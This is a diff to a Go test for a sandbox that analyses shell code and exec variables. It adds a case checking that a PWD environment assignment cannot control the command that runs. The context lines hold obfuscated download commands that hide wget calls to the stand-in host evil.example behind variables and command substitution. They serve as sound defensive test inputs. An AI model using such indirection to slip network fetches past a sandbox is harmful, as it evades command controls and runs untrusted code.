@@ -552,6 +552,8 @@ func TestSandboxExecStdinReadsShellCodeAndTheExecsVariables(t *testing.T) {
 				{nil, "bash -c '$(echo wget) https://evil.example/x' </dev/null\n"},
 				{nil, "sh -ec 'c=git; $c push origin main' </dev/null\n"},
 				{[]string{"W=wget"}, "$W https://evil.example/x </dev/null\n"},
+				// The shell sets PWD itself, whatever the exec says.
+				{[]string{"PWD=ls"}, "$PWD -la </dev/null\n"},
 				{nil, "env c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
 				{nil, "c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
 				{nil, "env -i c=wget sh -c '$c https://evil.example/x' </dev/null\n"},
